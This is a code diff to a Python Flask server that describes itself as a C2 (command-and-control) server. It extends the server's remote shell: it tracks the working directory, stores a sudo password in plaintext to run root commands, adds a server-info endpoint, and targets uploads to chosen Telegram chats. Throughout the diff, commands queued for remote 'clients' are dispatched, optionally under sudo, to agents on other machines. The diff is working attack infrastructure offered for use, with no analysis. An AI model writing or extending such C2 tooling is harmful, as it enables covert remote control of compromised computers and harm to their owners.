@@ -120,7 +120,8 @@ def init_db():
             status TEXT,
             result TEXT,
             created_at REAL,
-            executed_at REAL
+            executed_at REAL,
+            cwd TEXT
         )
     ''')
 
@@ -128,7 +129,7 @@ def init_db():
 
     # ── Migrations: add missing columns to existing tables ──
     existing = {row[1] for row in cursor.execute("PRAGMA table_info(commands)")}
-    for col, definition in [("result", "TEXT"), ("executed_at", "REAL")]:
+    for col, definition in [("result", "TEXT"), ("executed_at", "REAL"), ("cwd", "TEXT")]:
         if col not in existing:
             cursor.execute(f"ALTER TABLE commands ADD COLUMN {col} {definition}")
             logger.info(f"🔧 Migration: added commands.{col}")
@@ -163,15 +164,15 @@ def save_client_to_db(client_id, last_seen, os_info=None, hostname=None, ip=None
     except Exception as e:
         logger.error(f"Failed to save client to DB: {e}")
 
-def save_command_to_db(command, client_id, status="pending"):
+def save_command_to_db(command, client_id, status="pending", cwd=None):
     """Save command to DB and return the inserted row ID."""
     try:
         conn = sqlite3.connect(DB_PATH)
         cursor = conn.cursor()
         cursor.execute('''
-            INSERT INTO commands (command, client_id, status, created_at)
-            VALUES (?, ?, ?, ?)
-        ''', (command, client_id, status, time.time()))
+            INSERT INTO commands (command, client_id, status, created_at, cwd)
+            VALUES (?, ?, ?, ?, ?)
+        ''', (command, client_id, status, time.time(), cwd))
         row_id = cursor.lastrowid
         conn.commit()
         conn.close()
@@ -217,6 +218,44 @@ sessions = {}
 clients_data = []
 clients = {}
 commands = []
+
+# ======================== إعدادات السيرفر ========================
+SERVER_CONFIG_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'server_config.json')
+SUDO_PASSWORD = ""
+
+def _load_server_config():
+    global SUDO_PASSWORD
+    if os.path.exists(SERVER_CONFIG_PATH):
+        try:
+            with open(SERVER_CONFIG_PATH, 'r', encoding='utf-8') as f:
+                cfg = json.load(f)
+            SUDO_PASSWORD = cfg.get('sudo_password', '')
+            logger.info("✅ Server config loaded")
+        except Exception as e:
+            logger.error(f"Failed to load server config: {e}")
+
+def _save_server_config():
+    try:
+        with open(SERVER_CONFIG_PATH, 'w', encoding='utf-8') as f:
+            json.dump({'sudo_password': SUDO_PASSWORD}, f, ensure_ascii=False, indent=2)
+    except Exception as e:
+        logger.error(f"Failed to save server config: {e}")
+
+_load_server_config()
+
+# ======================== حالة الـ shell للـ C2-Server ========================
+# These track the current working directory and user for [C2-Server] commands
+C2_CWD  = os.path.expanduser("~")
+C2_USER = os.environ.get('USER', os.environ.get('LOGNAME', os.environ.get('USERNAME', 'user')))
+
+def _format_cwd_display(cwd: str) -> str:
+    """Replace home prefix with ~ for display."""
+    home = os.path.expanduser("~")
+    if cwd == home:
+        return "~"
+    if cwd.startswith(home + "/"):
+        return "~" + cwd[len(home):]
+    return cwd
 
 # ======================== إعدادات Telegram ========================
 TELEGRAM_CONFIG_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'telegram_config.json')
@@ -348,40 +387,92 @@ def receive_data():
 @rate_limit
 @require_auth
 def receive_command():
+    global C2_CWD, C2_USER
     data = request.json
-    cmd       = data.get("command")
+    cmd       = data.get("command", "").strip()
     client_id = data.get("client_id", "all")
     use_sudo  = bool(data.get("sudo", False))
 
     logger.warning(f"💀 Command received: {cmd} for {client_id} (sudo={use_sudo})")
-    row_id = save_command_to_db(cmd, client_id)
 
     # If the target is the C2 server itself, execute locally and return result immediately
     if client_id == "[C2-Server]":
+        # ── Handle `cd` specially ────────────────────────────────────
+        cd_match = None
+        stripped = cmd.strip()
+        if stripped == "cd" or stripped.startswith("cd ") or stripped.startswith("cd\t"):
+            cd_match = stripped[2:].strip() if len(stripped) > 2 else ""
+
+        if cd_match is not None:
+            # cd with no arg → go to home
+            target = os.path.expanduser(cd_match) if cd_match else os.path.expanduser("~")
+            # Handle relative paths
+            if not os.path.isabs(target):
+                target = os.path.join(C2_CWD, target)
+            target = os.path.normpath(target)
+            if os.path.isdir(target):
+                C2_CWD = target
+                output = ""
+                status = "done"
+            else:
+                output = f"bash: cd: {cd_match}: No such file or directory"
+                status = "error"
+            row_id = save_command_to_db(cmd, client_id, cwd=_format_cwd_display(C2_CWD))
+            try:
+                conn = sqlite3.connect(DB_PATH)
+                conn.execute(
+                    'UPDATE commands SET status=?, result=?, executed_at=? WHERE id=?',
+                    (status, output, time.time(), row_id)
+                )
+                conn.commit()
+                conn.close()
+            except Exception as e:
+                logger.error(f"Failed to update command result: {e}")
+            return jsonify({
+                "status": status, "command_id": row_id,
+                "result": output, "cwd": _format_cwd_display(C2_CWD),
+                "user": C2_USER,
+            })
+
+        # ── Save with current CWD ─────────────────────────────────────
+        row_id = save_command_to_db(cmd, client_id, cwd=_format_cwd_display(C2_CWD))
+
+        stdin_input = None
         if use_sudo:
-            # Use sudo -n (non-interactive — no password prompt)
-            shell_cmd = ["sudo", "-n", "bash", "-c", cmd]
-            use_shell = False
+            if SUDO_PASSWORD:
+                shell_cmd   = ["sudo", "-S", "bash", "-c", cmd]
+                stdin_input = SUDO_PASSWORD + "\n"
+                use_shell   = False
+            else:
+                shell_cmd = ["sudo", "-n", "bash", "-c", cmd]
+                use_shell = False
         else:
             shell_cmd = cmd
             use_shell = True
 
         try:
-            output = subprocess.check_output(
+            proc = subprocess.run(
                 shell_cmd, shell=use_shell,
-                stderr=subprocess.STDOUT,
-                timeout=15, text=True
-            ).strip()
-            status = "done"
-        except subprocess.TimeoutExpired:
-            output = "[error: command timed out after 15s]"
-            status = "error"
-        except subprocess.CalledProcessError as e:
-            raw = (e.output or "").strip()
-            if "sudo: a password is required" in raw or "sudo: a terminal is required" in raw:
-                output = "[error: sudo requires a password — add NOPASSWD to sudoers or run server as root]"
+                input=stdin_input,
+                capture_output=True,
+                timeout=30, text=True,
+                cwd=C2_CWD,
+            )
+            combined = (proc.stdout or "") + (proc.stderr or "")
+            lines  = [l for l in combined.splitlines() if not l.startswith("[sudo]")]
+            output = "\n".join(lines).strip()
+            if proc.returncode == 0:
+                status = "done"
             else:
-                output = raw or f"[error: exit code {e.returncode}]"
+                if "a password is required" in output or "a terminal is required" in output:
+                    output = "[error: sudo requires a password — set sudo password in Server Settings]"
+                elif "incorrect password" in output.lower() or "authentication failure" in output.lower():
+                    output = "[error: incorrect sudo password — update it in Server Settings]"
+                elif not output:
+                    output = f"[error: exit code {proc.returncode}]"
+                status = "error"
+        except subprocess.TimeoutExpired:
+            output = "[error: command timed out after 30s]"
             status = "error"
         except FileNotFoundError:
             output = "[error: sudo not found on this system]"
@@ -403,9 +494,14 @@ def receive_command():
             logger.error(f"Failed to update command result: {e}")
 
         logger.info(f"🖥️ [C2-Server] executed (sudo={use_sudo}): {cmd!r} → {status}")
-        return jsonify({"status": status, "command_id": row_id, "result": output})
+        return jsonify({
+            "status": status, "command_id": row_id,
+            "result": output, "cwd": _format_cwd_display(C2_CWD),
+            "user": C2_USER,
+        })
 
-    # Regular clients: wrap with sudo if requested, add to queue for agent to pick up
+    # Regular clients
+    row_id    = save_command_to_db(cmd, client_id)
     final_cmd = f"sudo -n bash -c '{cmd}'" if use_sudo else cmd
     commands.append({"cmd": final_cmd, "id": row_id})
     return jsonify({"status": "queued", "command_id": row_id})
@@ -565,9 +661,15 @@ def send_photo_to_telegram():
     if not TOKEN or not TOKEN.strip():
         return jsonify({"error": "No bot token configured."}), 400
 
-    photo     = request.files['photo']
-    filename  = photo.filename or "photo.jpg"
-    url       = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
+    photo            = request.files['photo']
+    filename         = photo.filename or "photo.jpg"
+    target_chat_id   = request.form.get('target_chat_id', '').strip()
+    url              = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
+
+    # Determine which chats to send to
+    chats_to_send = [target_chat_id] if target_chat_id else ALL_CHATS
+    if not chats_to_send:
+        return jsonify({"error": "No chat IDs configured. Add them from the Telegram settings page."}), 400
 
     # ── Save file to server ──────────────────────────────────────────
     uploads_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "uploads")
@@ -578,12 +680,13 @@ def send_photo_to_telegram():
     logger.info(f"📁 Photo saved to {save_path}")
 
     # ── Log to DB ────────────────────────────────────────────────────
-    save_log_to_db(time.time(), "photo", f"[dashboard upload] {filename} → saved to {save_path}", "dashboard")
+    target_label = target_chat_id if target_chat_id else "all chats"
+    save_log_to_db(time.time(), "photo", f"[dashboard upload] {filename} → saved to {save_path} | sent to {target_label}", "dashboard")
 
     # ── Send to Telegram chats ───────────────────────────────────────
     results = []
     any_ok  = False
-    for chat_id in ALL_CHATS:
+    for chat_id in chats_to_send:
         try:
             with open(save_path, "rb") as f:
                 r    = requests.post(url, data={"chat_id": chat_id}, files={"photo": f}, timeout=30)
@@ -611,9 +714,15 @@ def send_file_to_telegram():
     if not TOKEN or not TOKEN.strip():
         return jsonify({"error": "No bot token configured."}), 400
 
-    file      = request.files['file']
-    filename  = file.filename or "file.bin"
-    url       = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
+    file             = request.files['file']
+    filename         = file.filename or "file.bin"
+    target_chat_id   = request.form.get('target_chat_id', '').strip()
+    url              = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
+
+    # Determine which chats to send to
+    chats_to_send = [target_chat_id] if target_chat_id else ALL_CHATS
+    if not chats_to_send:
+        return jsonify({"error": "No chat IDs configured. Add them from the Telegram settings page."}), 400
 
     # ── Save file to server ──────────────────────────────────────────
     uploads_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "uploads")
@@ -624,13 +733,14 @@ def send_file_to_telegram():
     logger.info(f"📁 File saved to {save_path}")
 
     # ── Log to DB ────────────────────────────────────────────────────
-    size_kb = os.path.getsize(save_path) / 1024
-    save_log_to_db(time.time(), "file", f"[dashboard upload] {filename} ({size_kb:.1f} KB) → saved to {save_path}", "dashboard")
+    size_kb      = os.path.getsize(save_path) / 1024
+    target_label = target_chat_id if target_chat_id else "all chats"
+    save_log_to_db(time.time(), "file", f"[dashboard upload] {filename} ({size_kb:.1f} KB) → saved to {save_path} | sent to {target_label}", "dashboard")
 
     # ── Send to Telegram chats ───────────────────────────────────────
     results = []
     any_ok  = False
-    for chat_id in ALL_CHATS:
+    for chat_id in chats_to_send:
         try:
             with open(save_path, "rb") as f:
                 r    = requests.post(
@@ -723,7 +833,52 @@ def delete_telegram_config():
     logger.info("🗑️ Telegram config cleared")
     return jsonify({"status": "deleted"})
 
-# ======================== 13. اختبار ========================
+# ======================== 13. إعدادات السيرفر ========================
+@app.route("/server_config", methods=["GET"])
+@rate_limit
+@require_auth
+def get_server_config():
+    return jsonify({
+        "has_sudo_password": bool(SUDO_PASSWORD),
+        "sudo_password_hint": "••••" if SUDO_PASSWORD else "",
+    })
+
+@app.route("/server_config", methods=["POST"])
+@rate_limit
+@require_auth
+def update_server_config():
+    global SUDO_PASSWORD
+    data = request.json or {}
+    if "sudo_password" in data:
+        SUDO_PASSWORD = data["sudo_password"]
+        _save_server_config()
+        logger.info("🔑 Sudo password updated")
+    return jsonify({"status": "updated"})
+
+@app.route("/server_config", methods=["DELETE"])
+@rate_limit
+@require_auth
+def delete_server_config():
+    global SUDO_PASSWORD
+    SUDO_PASSWORD = ""
+    _save_server_config()
+    logger.info("🗑️ Sudo password cleared")
+    return jsonify({"status": "cleared"})
+
+# ======================== 13b. معلومات shell الـ C2-Server ========================
+@app.route("/server_info", methods=["GET"])
+@rate_limit
+@require_auth
+def server_info():
+    """Return current shell state (user, hostname, cwd) for the terminal prompt."""
+    return jsonify({
+        "user":     C2_USER,
+        "hostname": socket.gethostname(),
+        "cwd":      _format_cwd_display(C2_CWD),
+        "is_root":  (C2_USER == "root" or os.geteuid() == 0),
+    })
+
+# ======================== 13c. اختبار ========================
 @app.route("/test_data", methods=["POST"])
 @rate_limit
 def test_data():
@@ -763,7 +918,7 @@ def commands_history():
         conn = sqlite3.connect(DB_PATH)
         cursor = conn.cursor()
         cursor.execute(
-            'SELECT id, command, client_id, status, result, created_at, executed_at '
+            'SELECT id, command, client_id, status, result, created_at, executed_at, cwd '
             'FROM commands ORDER BY id DESC LIMIT 100'
         )
         rows = cursor.fetchall()
@@ -778,6 +933,7 @@ def commands_history():
                 "result":      row[4],
                 "created_at":  time.ctime(row[5]) if row[5] else None,
                 "executed_at": time.ctime(row[6]) if row[6] else None,
+                "cwd":         row[7],
             })
         return jsonify(history)
     except Exception as e:
